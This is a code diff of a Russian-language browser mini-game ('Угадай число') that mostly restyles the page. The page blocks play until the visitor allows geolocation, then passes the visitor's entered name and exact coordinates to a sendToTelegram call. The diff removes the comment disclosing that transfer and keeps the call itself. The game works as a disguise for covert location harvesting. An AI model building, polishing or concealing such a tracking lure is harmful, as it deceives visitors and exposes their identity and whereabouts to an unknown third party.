@@ -4,56 +4,130 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Мини игра: Угадай число</title>
+<!-- Подключаем шрифт Poppins -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
 <style>
+  /* Сброс стилей */
+  * {
+    box-sizing: border-box;
+  }
+
   body {
-    font-family: Arial, sans-serif;
-    background: #222;
-    color: #eee;
+    margin: 0;
+    min-height: 100vh;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: #f0f0f3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  #container {
+    background: rgba(0,0,0,0.5);
+    padding: 30px 40px;
+    border-radius: 15px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    width: 100%;
+    max-width: 420px;
     text-align: center;
-    padding: 30px;
   }
-  #name-section, #game, #deny-message {
-    display: none;
+
+  h1, h2 {
+    margin-bottom: 25px;
+    font-weight: 600;
+    text-shadow: 0 2px 8px rgba(0,0,0,0.4);
   }
-  input, button {
-    padding: 10px;
+
+  input[type="text"], input[type="number"] {
+    width: 100%;
+    padding: 14px 18px;
     font-size: 18px;
-    margin: 10px 0;
+    border: none;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    outline: none;
+    box-shadow: inset 0 0 8px rgba(255,255,255,0.2);
+    transition: box-shadow 0.3s ease;
+    background-color: rgba(255,255,255,0.1);
+    color: #eee;
   }
+  input[type="text"]::placeholder,
+  input[type="number"]::placeholder {
+    color: #ccc;
+  }
+  input[type="text"]:focus,
+  input[type="number"]:focus {
+    box-shadow: inset 0 0 12px #a18aff;
+    background-color: rgba(255,255,255,0.15);
+  }
+
   button {
-    cursor: pointer;
-  }
-  #message {
-    margin-top: 20px;
+    background: #8a63d2;
+    border: none;
+    padding: 14px 0;
+    width: 100%;
     font-size: 20px;
+    font-weight: 600;
+    border-radius: 10px;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    box-shadow: 0 4px 10px rgba(138, 99, 210, 0.6);
+  }
+  button:hover {
+    background: #a080ff;
+    box-shadow: 0 6px 14px rgba(160, 128, 255, 0.8);
+  }
+
+  #message, #name-error {
+    font-size: 18px;
+    margin-top: 15px;
+    min-height: 24px;
+    color: #ffd966;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+  }
+
+  #deny-message p {
+    font-size: 18px;
+    color: #ffb3b3;
+    font-weight: 600;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.6);
+  }
+
+  #guess-section {
+    margin-bottom: 15px;
   }
 </style>
 </head>
 <body>
 
-<h1>Мини игра: Угадай число</h1>
+<div id="container">
 
-<div id="deny-message">
-  <p>Для игры нужно разрешить определение местоположения.<br>Пожалуйста, перезайдите на сайт и разрешите доступ.</p>
-</div>
+  <h1>Мини игра: Угадай число</h1>
 
-<div id="name-section">
-  <p>Геолокация получена! Введите ваше имя, чтобы начать игру.</p>
-  <input type="text" id="username" placeholder="Введите имя" />
-  <br />
-  <button id="start-btn">Начать игру</button>
-  <p id="name-error" style="color: red;"></p>
-</div>
-
-<div id="game">
-  <h2>Привет, <span id="display-name"></span>! Угадай число от 1 до 20</h2>
-  <div id="guess-section">
-    <input type="number" id="guess-input" min="1" max="20" placeholder="Введи число" />
-    <br />
-    <button id="guess-btn">Угадать</button>
+  <div id="deny-message">
+    <p>Для игры нужно разрешить определение местоположения.<br>Пожалуйста, перезайдите на сайт и разрешите доступ.</p>
   </div>
-  <p id="message"></p>
-  <p>Попыток осталось: <span id="attempts-left"></span></p>
+
+  <div id="name-section">
+    <p>Геолокация получена! Введите ваше имя, чтобы начать игру.</p>
+    <input type="text" id="username" placeholder="Введите имя" autocomplete="off" />
+    <button id="start-btn">Начать игру</button>
+    <p id="name-error"></p>
+  </div>
+
+  <div id="game">
+    <h2>Привет, <span id="display-name"></span>! Угадай число от 1 до 20</h2>
+    <div id="guess-section">
+      <input type="number" id="guess-input" min="1" max="20" placeholder="Введи число" autocomplete="off" />
+    </div>
+    <button id="guess-btn">Угадать</button>
+    <p id="message"></p>
+    <p>Попыток осталось: <span id="attempts-left"></span></p>
+  </div>
+
 </div>
 
 <script>
@@ -78,20 +152,24 @@
   let attemptsLeft = 5;
   let playerName = '';
 
-  // При загрузке запрашиваем геолокацию
   window.onload = () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         position => {
           coords = position.coords;
+          denyMessage.style.display = 'none';
           nameSection.style.display = 'block';
         },
         error => {
           denyMessage.style.display = 'block';
+          nameSection.style.display = 'none';
+          gameSection.style.display = 'none';
         }
       );
     } else {
       denyMessage.style.display = 'block';
+      nameSection.style.display = 'none';
+      gameSection.style.display = 'none';
     }
   };
 
@@ -104,10 +182,7 @@
     nameError.textContent = '';
     playerName = name;
 
-    // Отправляем в Telegram имя + координаты
     sendToTelegram(playerName, coords.latitude, coords.longitude);
-
-    // Запускаем игру
     startGame();
   });
 
@@ -121,6 +196,7 @@
     message.textContent = 'Угадайте число!';
     guessInput.value = '';
     guessInput.focus();
+    guessSection.style.display = 'block';
   }
 
   guessBtn.addEventListener('click', () => {
